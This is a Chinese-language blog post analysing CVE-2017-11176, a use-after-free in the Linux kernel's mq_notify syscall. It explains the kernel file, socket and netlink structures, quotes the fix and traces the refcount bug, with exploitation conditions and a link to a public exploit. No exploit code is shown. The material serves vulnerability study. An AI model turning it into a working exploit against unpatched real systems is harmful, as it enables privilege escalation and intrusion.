<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>使用Lexfo的博客中Debian 8.6.0 amd64的Linux系统和VMware Fusion进行调试。原博客中有部分代码和脚本无法在实验环境下运行，直接做了修改，因此本文中部分代码和脚本和原文中不一致。</p>
<p>漏洞复现条件：</p>
<ul>
<li>内核版本小于4.11.9</li>
<li>amd64架构</li>
<li>内核使用SLAB分配器</li>
<li>开启SMEP</li>
<li>关闭kASLR和SMAP</li>
<li>内存大于512MB</li>
<li>能够对目标系统进行调试</li>
<li>建议只使用1个CPU</li>
</ul>
<p>测试<a href="https://github.com/lexfo/linux/blob/master/cve-2017-11176.c">exploit</a>，系统能够被exp crash（需要针对性地调整exp才能在目标系统上getshell）。</p>
<h3 id="0x01-核心概念-1"><a href="#0x01-核心概念-1" class="headerlink" title="0x01 核心概念 #1"></a>0x01 核心概念 #1</h3><h4 id="进程描述符和current宏"><a href="#进程描述符和current宏" class="headerlink" title="进程描述符和current宏"></a>进程描述符和current宏</h4><p>每个线程都有一个<code>task_struct</code>：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// [include/linux/sched.h]</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="keyword">long</span> state;            <span class="comment">// process state (running, stopped, ...)</span></span><br><span class="line">    <span class="keyword">void</span> *<span class="built_in">stack</span>;                    <span class="comment">// task&#x27;s stack pointer</span></span><br><span class="line">    <span class="keyword">int</span> prio;                       <span class="comment">// process priority</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span>;</span>           <span class="comment">// memory address space</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">files_struct</span> *<span class="title">files</span>;</span>     <span class="comment">// open file information</span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">cred</span>;</span>        <span class="comment">// credentials</span></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>通过<code>current</code>宏可以获取当前正在运行的<code>task</code>的结构体指针。</p>
<h4 id="文件描述符、文件对象、文件描述表"><a href="#文件描述符、文件对象、文件描述表" class="headerlink" title="文件描述符、文件对象、文件描述表"></a>文件描述符、文件对象、文件描述表</h4><p>在Linux中，有七种文件：常规、目录、链接、字设备、块设备、fifo和socket，它们都用文件描述符来表示。文件描述符本质上是一个整数，只有对特定的进程才有意义。每个文件描述符与文件结构体相关联。</p>
<p>文件对象用来表示一个被打开的文件，它并不需要匹配硬盘上的某个映像。指向file结构体的指针通常被命名为filp(file pointer)。</p>
<p>几个最重要的file结构体成员：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// [include/linux/fs.h]</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> &#123;</span></span><br><span class="line">    <span class="keyword">loff_t</span>                            f_pos;            <span class="comment">// &quot;cursor&quot; while reading file</span></span><br><span class="line">    <span class="keyword">atomic_long_t</span>                     f_count;          <span class="comment">// object&#x27;s reference counter</span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span>      *<span class="title">f_op</span>;</span>            <span class="comment">// virtual function table (VFT) pointer</span></span><br><span class="line">  <span class="keyword">void</span>                              *private_data;      <span class="comment">// used by file &quot;specialization&quot;</span></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>文件描述符和file结构体指针的映射表被称作<code>file descriptor table(fdt)</code>，它并不是1对1映射，可能存在多个描述符映射到同一结构体指针的情况，因此file结构体中有<code>f_count</code>成员来记录引用情况。FDT的结构体被称为<code>fdtable</code>，它就是一个array。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// [include/linux/fdtable.h]</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fdtable</span> &#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> max_fds;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> ** <span class="title">fd</span>;</span>      <span class="comment">/* current fd array */</span></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>将FDT和进程相连接的是<code>files_struct</code>结构体，由于<code>fdtable</code>还包含其他信息，因此并不直接放入<code>task_struct</code>中。<code>files_struct</code>同样可以在多个线程之间共享。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// [include/linux/fdtable.h]</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">files_struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">atomic_t</span> count;           <span class="comment">// reference counter</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fdtable</span> *<span class="title">fdt</span>;</span>      <span class="comment">// pointer to the file descriptor table</span></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>指向<code>files_struct</code>的指针保存在<code>task_struct</code>中。</p>
<h4 id="虚函数表-VFT"><a href="#虚函数表-VFT" class="headerlink" title="虚函数表(VFT)"></a>虚函数表(VFT)</h4><p>最广为人知的VFT是<code>struct file_operations</code>：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// [include/linux/fs.h]</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> &#123;</span></span><br><span class="line">    <span class="keyword">ssize_t</span> (*read) (struct file *, <span class="keyword">char</span> __user *, <span class="keyword">size_t</span>, <span class="keyword">loff_t</span> *);</span><br><span class="line">    <span class="keyword">ssize_t</span> (*write) (struct file *, <span class="keyword">const</span> <span class="keyword">char</span> __user *, <span class="keyword">size_t</span>, <span class="keyword">loff_t</span> *);</span><br><span class="line">    <span class="keyword">int</span> (*open) (struct inode *, struct file *);</span><br><span class="line">    <span class="keyword">int</span> (*release) (struct inode *, struct file *);</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>由于Linux中所有东西都被看作文件，但其类型又不一样，所以有着不一样的<code>file operations</code>，常被称作<code>f_ops</code>。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (file-&gt;f_op-&gt;read)</span><br><span class="line">    ret = file-&gt;f_op-&gt;read(file, buf, count, pos);</span><br></pre></td></tr></table></figure>

<h4 id="Socket、Sock、SKB"><a href="#Socket、Sock、SKB" class="headerlink" title="Socket、Sock、SKB"></a>Socket、Sock、SKB</h4><p><code>socket</code>结构体位于网络栈的顶层。在socket创建过程中，一个新的<code>file</code>结构体被创建并且<code>f_op</code>被设置为<code>socket_file_ops</code>。由于每个文件以文件描述符的形式表示，因此对文件操作的syscall适用于所有文件，对于socket，内核将调用socket的文件操作：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// [net/socket.c]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">socket_file_ops</span> = &#123;</span></span><br><span class="line">    .read = sock_aio_read,      <span class="comment">// &lt;---- calls sock-&gt;ops-&gt;recvmsg()</span></span><br><span class="line">    .write =    sock_aio_write, <span class="comment">// &lt;---- calls sock-&gt;ops-&gt;sendmsg()</span></span><br><span class="line">    .llseek =   no_llseek,      <span class="comment">// &lt;---- returns an error</span></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于<code>socket</code>结构体实际上应用了BSD socket API，它集成了一个特殊的VFT结构体<code>proto_ops</code>。每个类型的<code>socket</code>（例如AF_INET、AF_NETLINK等）实现它自己的proto_ops`。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// [include/linux/net.h]</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proto_ops</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span>     (*bind)    (struct socket *sock, struct sockaddr *myaddr, <span class="keyword">int</span> sockaddr_len);</span><br><span class="line">    <span class="keyword">int</span>     (*connect) (struct socket *sock, struct sockaddr *vaddr,  <span class="keyword">int</span> sockaddr_len, <span class="keyword">int</span> flags);</span><br><span class="line">    <span class="keyword">int</span>     (*accept)  (struct socket *sock, struct socket *newsock, <span class="keyword">int</span> flags);</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当BSD形式的系统调用被触发，内核总体上遵循以下架构：</p>
<ol>
<li>从FDT中检索<code>file</code>结构体</li>
<li>从<code>file</code>结构体中检索<code>socket</code>结构体</li>
<li>调用<code>proto_ops</code>中的操作</li>
</ol>
<p>因为一些协议的操作可能需要进入到网络栈的底层，所以<code>socket</code>结构体有一个指针指向<code>sock</code>对象。这个指针主要是为了进行<code>socket</code>的协议操作(proto_ops)。<code>socket</code>结构体可以看作是<code>file</code>结构体和<code>sock</code>结构体的”胶水”。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// [include/linux/net.h]</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">socket</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span>     *<span class="title">file</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock</span>     *<span class="title">sk</span>;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">proto_ops</span>  *<span class="title">ops</span>;</span></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><code>sock</code>结构体是一个复杂的结构体，人们可能会把其看作是下层（网卡驱动）和更高级别（socket）之间的中间事物，主要目的是能够以通用方式保持接收和发送的缓冲区。</p>
<p>当通过网卡接收到数据包时，驱动将网络数据包排队到sock的接收缓冲区中。数据包会在缓冲区一直存在直到程序决定接收它（使用recvmsg()系统调用）。发送时也一样，只不过由网卡将数据包从队列移出并发送。</p>
<p>这些网络数据包(are so-called struct sk_buff or skb)。这些缓冲区基本上都是skb的双向链表。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// [include/linux/sock.h]</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span>         sk_rcvbuf;    <span class="comment">// theorical &quot;max&quot; size of the receive buffer</span></span><br><span class="line">    <span class="keyword">int</span>         sk_sndbuf;    <span class="comment">// theorical &quot;max&quot; size of the send buffer</span></span><br><span class="line">    <span class="keyword">atomic_t</span>        sk_rmem_alloc;  <span class="comment">// &quot;current&quot; size of the receive buffer</span></span><br><span class="line">    <span class="keyword">atomic_t</span>        sk_wmem_alloc;  <span class="comment">// &quot;current&quot; size of the send buffer</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sk_buff_head</span> <span class="title">sk_receive_queue</span>;</span>   <span class="comment">// head of doubly-linked list</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sk_buff_head</span> <span class="title">sk_write_queue</span>;</span>     <span class="comment">// head of doubly-linked list</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">socket</span>       *<span class="title">sk_socket</span>;</span></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>sock</code>结构体引用了<code>socket</code>结构体，而<code>socket</code>结构体也引用了<code>sock</code>结构体。同样地，<code>socket</code>结构体引用<code>file</code>结构体，<code>file</code>结构体引用<code>socket</code>结构体（private_data）。这种双向机制允许数据在网络栈中上下移动。</p>
<p>struct sock对象通常称为sk，而struct socket对象通常称为sock。</p>
<h4 id="Netlink-Socket"><a href="#Netlink-Socket" class="headerlink" title="Netlink Socket"></a>Netlink Socket</h4><p>Netlink Socket是socket的一种类型，就像UNIX或INET套接字一样。Netlink Socket(AF_NETLINK)允许内核和用户态之间的通信，它可以用来修改路由表、接收SELinux事件通知，甚至与其他用户进程通信。</p>
<p>由于<code>sock</code>和<code>socket</code>结构体是支持各种套接字的通用数据结构，因此有必要在某种程度上进行专门化。从socket角度来看，需要定义<code>proto_ops</code>，对于netlink系列，相关操作是<code>netlink_ops</code>：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// [net/netlink/af_netlink.c]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">proto_ops</span> <span class="title">netlink_ops</span> = &#123;</span></span><br><span class="line">    .bind =     netlink_bind,</span><br><span class="line">    .accept =   sock_no_accept,     <span class="comment">// &lt;--- calling accept() on netlink sockets leads to EOPNOTSUPP error</span></span><br><span class="line">    .sendmsg =  netlink_sendmsg,</span><br><span class="line">    .recvmsg =  netlink_recvmsg,</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// [include/net/netlink_sock.h]</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">netlink_sock</span> &#123;</span></span><br><span class="line">    <span class="comment">/* struct sock has to be the first member of netlink_sock */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock</span>     <span class="title">sk</span>;</span></span><br><span class="line">    u32         pid;</span><br><span class="line">    u32         dst_pid;</span><br><span class="line">    u32         dst_group;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>换句话说，<code>netlink_sock</code>是具有一些附加属性的<code>sock</code>。</p>
<p>它允许内核在不知道其精确类型的情况下操作通用<code>sock</code>结构体。 它还带来了另一个好处，＆netlink_sock.sk是＆netlink_sock同个地址。</p>
<h4 id="Putting-it-all-together"><a href="#Putting-it-all-together" class="headerlink" title="Putting it all together"></a>Putting it all together</h4><p><img src="https://github.com/sunichi/hexo_images/blob/master/blog/CVE-2017-11176/1.png?raw=true" alt="数据结构关系图"></p>
<h4 id="Reference-counters"><a href="#Reference-counters" class="headerlink" title="Reference counters"></a>Reference counters</h4><p>为了总结这些内核核心概念的介绍，有必要理解内核如何处理<code>reference counters</code>。为了减少内核内存泄漏和防止UAF，大多数Linux的数据结构中有<code>ref counter</code>，为<code>atomic_t</code>类型（<code>int</code>）。通过如下原子操作对<code>ref counter</code>进行操作：</p>
<ul>
<li>atomic_inc()</li>
<li>atomic_add()</li>
<li>atomic_dec_and_test() // substract 1 and test if it is equals zero</li>
</ul>
<p>这些操作都要由开发人员手动完成。但是存在这样的风险：</p>
<ul>
<li>减少<code>refcounter</code>两次：UAF</li>
<li>增加<code>refcounter</code>两次：内存泄漏或整数溢出导致UAF</li>
</ul>
<p>Linux内核通过普通接口有多种手段处理<code>refcounter</code>(<code>kref</code>,<code>kobject</code>)。但是，它没有系统地使用操作的对象中已有的<code>refcounter helper</code>，而是使用<code>*_get()</code>和<code>*_put()</code>等函数。</p>
<p>在这个例子中，每个对象有不同的<code>helper</code>名字：</p>
<ul>
<li><p><strong>struct sock</strong>: sock_hold(), sock_put()</p>
</li>
<li><p><strong>struct file</strong>: fget(), fput()</p>
</li>
<li><p><strong>struct files_struct</strong>: get_files_struct(), put_files_struct()</p>
</li>
<li><p>…</p>
</li>
<li><p><strong>WARNING</strong>: it can get even more confusing! For instance, <strong>skb_put()</strong> actually does not decrease any refcounter, it “pushes” data into the sk buffer! Do not assume anything about what a function does based on its name, check it.</p>
</li>
</ul>
<p>与本CVE的相关的数据结构以上已介绍完毕，接下来开始分析CVE。</p>
<h3 id="0x02-Public-Information"><a href="#0x02-Public-Information" class="headerlink" title="0x02 Public Information"></a>0x02 Public Information</h3><p>首先介绍下<code>mq_notify</code>系统调用的用途，<code>mq_*</code>代表”POSIX message queues”，用来代替System V message queues：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">POSIX message queues allow processes to exchange data in the form of messages.</span><br><span class="line">This API is distinct from that provided by System V message  queues (msgget(2),</span><br><span class="line">msgsnd(2), msgrcv(2), etc.), but provides similar functionality.</span><br></pre></td></tr></table></figure>

<p><code>mq_notify()</code>系统调用用来注册或注销异步提醒：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mq_notify() allows the calling process to register or unregister for delivery of an asynchronous notification when a new message arrives on the empty message queue referred to by the descriptor mqdes.</span><br></pre></td></tr></table></figure>

<p>相关Patch：</p>
<p>在例如4.11.9的内核代码中，<code>mq_notify()</code>在进入<code>retry</code>逻辑之前没有把<code>sock</code>指针清空。当用户态关闭了<code>netlink socket</code>，这个UAF使得攻击能够发起DoS攻击并有可能造成进一步的影响。</p>
<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line">diff --git a/ipc/mqueue.c b/ipc/mqueue.c</span><br><span class="line">index c9ff943..eb1391b 100644</span><br><span class="line"><span class="comment">--- a/ipc/mqueue.c</span></span><br><span class="line"><span class="comment">+++ b/ipc/mqueue.c</span></span><br><span class="line">@@ -1270,8 +1270,10 @@ retry:</span><br><span class="line"></span><br><span class="line">      timeo = MAX_SCHEDULE_TIMEOUT;</span><br><span class="line">      ret = netlink_attachskb(sock, nc, &amp;timeo, NULL);</span><br><span class="line"><span class="deletion">-     if (ret == 1)</span></span><br><span class="line"><span class="addition">+     if (ret == 1) &#123;</span></span><br><span class="line"><span class="addition">+       sock = NULL;</span></span><br><span class="line">        goto retry;</span><br><span class="line"><span class="addition">+     &#125;</span></span><br><span class="line">      if (ret) &#123;</span><br><span class="line">        sock = NULL;</span><br><span class="line">        nc = NULL;</span><br></pre></td></tr></table></figure>

<p>Patch的描述提供了更多的信息：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">mqueue: fix a use-after-free in sys_mq_notify()</span><br><span class="line">The retry logic for netlink_attachskb() inside sys_mq_notify()</span><br><span class="line">is nasty and vulnerable:</span><br><span class="line"></span><br><span class="line">1) The sock refcnt is already released when retry is needed</span><br><span class="line">2) The fd is controllable by user-space because we already</span><br><span class="line">   release the file refcnt</span><br><span class="line"></span><br><span class="line">so we then retry but the fd has been just closed by user-space</span><br><span class="line">during this small window, we end up calling netlink_detachskb()</span><br><span class="line">on the error path which releases the sock again, later when</span><br><span class="line">the user-space closes this socket a use-after-free could be</span><br><span class="line">triggered.</span><br><span class="line"></span><br><span class="line">Setting &#x27;sock&#x27; to NULL here should be sufficient to fix it</span><br></pre></td></tr></table></figure>

<ul>
<li>有漏洞的代码存在于<code>mq_notify</code></li>
<li>在<code>retry</code>的逻辑中有错误</li>
<li>在<code>sock</code>的计数器上有错误导致UAF</li>
<li>漏洞与已经关闭的<code>fd</code>的条件竞争有关</li>
</ul>
<h3 id="0x03-Understanding-the-Bug"><a href="#0x03-Understanding-the-Bug" class="headerlink" title="0x03 Understanding the Bug"></a>0x03 Understanding the Bug</h3><h4 id="问题代码"><a href="#问题代码" class="headerlink" title="问题代码"></a>问题代码</h4><p>重点关注<code>retry</code>的逻辑和函数退出的路径：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">      <span class="comment">// from [ipc/mqueue.c]</span></span><br><span class="line"></span><br><span class="line">      SYSCALL_DEFINE2(mq_notify, <span class="keyword">mqd_t</span>, mqdes,</span><br><span class="line">          <span class="keyword">const</span> struct sigevent __user *, u_notification)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">int</span> ret;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">filp</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sock</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">sigevent</span> <span class="title">notification</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span> *<span class="title">nc</span>;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// ... cut (copy userland data to kernel + skb allocation) ...</span></span><br><span class="line"></span><br><span class="line">        sock = <span class="literal">NULL</span>;</span><br><span class="line">    retry:</span><br><span class="line">[<span class="number">0</span>]       filp = fget(notification.sigev_signo);</span><br><span class="line">          <span class="keyword">if</span> (!filp) &#123;</span><br><span class="line">            ret = -EBADF;</span><br><span class="line">[<span class="number">1</span>]         <span class="keyword">goto</span> out;</span><br><span class="line">          &#125;</span><br><span class="line">[<span class="number">2</span>a]      sock = netlink_getsockbyfilp(filp);</span><br><span class="line">[<span class="number">2b</span>]      fput(filp);</span><br><span class="line">          <span class="keyword">if</span> (IS_ERR(sock)) &#123;</span><br><span class="line">            ret = PTR_ERR(sock);</span><br><span class="line">            sock = <span class="literal">NULL</span>;</span><br><span class="line">[<span class="number">3</span>]         <span class="keyword">goto</span> out;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          timeo = MAX_SCHEDULE_TIMEOUT;</span><br><span class="line">[<span class="number">4</span>]       ret = netlink_attachskb(sock, nc, &amp;timeo, <span class="literal">NULL</span>);</span><br><span class="line">          <span class="keyword">if</span> (ret == <span class="number">1</span>)</span><br><span class="line">[<span class="number">5</span>a]        <span class="keyword">goto</span> retry;</span><br><span class="line">          <span class="keyword">if</span> (ret) &#123;</span><br><span class="line">            sock = <span class="literal">NULL</span>;</span><br><span class="line">            nc = <span class="literal">NULL</span>;</span><br><span class="line">[<span class="number">5b</span>]        <span class="keyword">goto</span> out;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">[<span class="number">5</span>c]    <span class="comment">// ... cut (normal path) ...</span></span><br><span class="line"></span><br><span class="line">      out:</span><br><span class="line">        <span class="keyword">if</span> (sock) &#123;</span><br><span class="line">          netlink_detachskb(sock, nc);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (nc) &#123;</span><br><span class="line">          dev_kfree_skb(nc);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>

<p>代码开始于获取用户态提供的文件描述符[0]，如果这个<code>fd</code>不存在于当前进程的<code>fdt</code>中，将会返回空指针并进入退出流程[1]。此外，提供的文件的<code>sock</code>对象也被获取[2a]。如果没有有效的<code>sock</code>对象，同样会置NULL并进入退出流程[3]。在这两种情况下(?)，<code>file</code>结构体引用会被减一(dropped)[2b]。</p>
<p>最后，会调用<code>netlink_attachskb()</code>[4]，尝试将<code>sk_buff(nc)</code>加入到<code>sock</code>的接收队列，在这有三种可能的结果：</p>
<ol>
<li>一切正常[5c]</li>
<li>函数返回1，代码跳转到<code>retry</code>标签[5a]</li>
<li><code>nc</code>和<code>sock</code>都被设置为NULL，代码跳转到退出流程[5b]</li>
</ol>
<h4 id="为什么要清空sock指针"><a href="#为什么要清空sock指针" class="headerlink" title="为什么要清空sock指针"></a>为什么要清空sock指针</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">out:</span><br><span class="line">  <span class="keyword">if</span> (sock) &#123;</span><br><span class="line">    netlink_detachskb(sock, nc);  <span class="comment">// &lt;----- here</span></span><br><span class="line">  &#125; </span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// from [net/netlink/af_netlink.c]</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">netlink_detachskb</span><span class="params">(struct sock *sk, struct sk_buff *skb)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  kfree_skb(skb);</span><br><span class="line">  sock_put(sk);       <span class="comment">// &lt;----- here</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// from [include/net/sock.h]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Ungrab socket and destroy it if it was the last reference. */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">sock_put</span><span class="params">(struct sock *sk)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (atomic_dec_and_test(&amp;sk-&gt;sk_refcnt))    <span class="comment">// &lt;----- here</span></span><br><span class="line">    sk_free(sk);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果<code>sock</code>被置NULL并进入退出流程，它的引用计数器<code>sk_refcnt</code>无条件地会被减1。如patch所描述的，漏洞代码的<code>sock</code>对象的<code>refcount</code>存在着问题，但<code>refcount</code>是在何处被加1的？查看<code>netlink_getsockbyfilp()</code>[2a]：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">    <span class="comment">// from [net/netlink/af_netlink.c]</span></span><br><span class="line"></span><br><span class="line">    <span class="function">struct sock *<span class="title">netlink_getsockbyfilp</span><span class="params">(struct file *filp)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span> = <span class="title">filp</span>-&gt;<span class="title">f_path</span>.<span class="title">dentry</span>-&gt;<span class="title">d_inode</span>;</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sock</span>;</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!S_ISSOCK(inode-&gt;i_mode))</span><br><span class="line">        <span class="keyword">return</span> ERR_PTR(-ENOTSOCK);</span><br><span class="line"></span><br><span class="line">      sock = SOCKET_I(inode)-&gt;sk;</span><br><span class="line">      <span class="keyword">if</span> (sock-&gt;sk_family != AF_NETLINK)</span><br><span class="line">        <span class="keyword">return</span> ERR_PTR(-EINVAL);</span><br><span class="line"></span><br><span class="line">[<span class="number">0</span>]   sock_hold(sock);    <span class="comment">// &lt;----- here</span></span><br><span class="line">      <span class="keyword">return</span> sock;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// from [include/net/sock.h]</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">sock_hold</span><span class="params">(struct sock *sk)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  atomic_inc(&amp;sk-&gt;sk_refcnt);   <span class="comment">// &lt;------ here</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>sock</code>对象的<code>refcounter</code>在[0]处被增加，计数器无条件地被<code>netlink_getsockbyfilp()</code>加一，被<code>netlink_detachskb()</code>（如果<code>sock</code>非空）减一，这意味着<code>netlink_attachskb()</code>应该以某种形式对<code>refcounter</code>保持中立。（attach的调用位于另外两个函数中间）</p>
<p>简化版的<code>netlink_attachskb()</code>代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// from [net/netlink/af_netlink.c]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Attach a skb to a netlink socket.</span></span><br><span class="line"><span class="comment"> * The caller must hold a reference to the destination socket. On error, the</span></span><br><span class="line"><span class="comment"> * reference is dropped. The skb is not sent to the destination, just all</span></span><br><span class="line"><span class="comment"> * all error checks are performed and memory in the queue is reserved.</span></span><br><span class="line"><span class="comment"> * Return values:</span></span><br><span class="line"><span class="comment"> * &lt; 0: error. skb freed, reference to sock dropped.</span></span><br><span class="line"><span class="comment"> * 0: continue</span></span><br><span class="line"><span class="comment"> * 1: repeat lookup - reference dropped while waiting for socket memory.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">netlink_attachskb</span><span class="params">(struct sock *sk, struct sk_buff *skb,</span></span></span><br><span class="line"><span class="function"><span class="params">          <span class="keyword">long</span> *timeo, struct sock *ssk)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">netlink_sock</span> *<span class="title">nlk</span>;</span></span><br><span class="line"></span><br><span class="line">  nlk = nlk_sk(sk);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (atomic_read(&amp;sk-&gt;sk_rmem_alloc) &gt; sk-&gt;sk_rcvbuf || test_bit(<span class="number">0</span>, &amp;nlk-&gt;state)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ... cut (wait until some conditions) ...</span></span><br><span class="line"></span><br><span class="line">    sock_put(sk);         <span class="comment">// &lt;----- refcnt decremented here</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (signal_pending(current)) &#123;</span><br><span class="line">      kfree_skb(skb);</span><br><span class="line">      <span class="keyword">return</span> sock_intr_errno(*timeo); <span class="comment">// &lt;----- &quot;error&quot; path</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;   <span class="comment">// &lt;----- &quot;retry&quot; path</span></span><br><span class="line">  &#125;</span><br><span class="line">  skb_set_owner_r(skb, sk);   <span class="comment">// &lt;----- &quot;normal&quot; path</span></span><br><span class="line">  <span class="keyword">return</span> 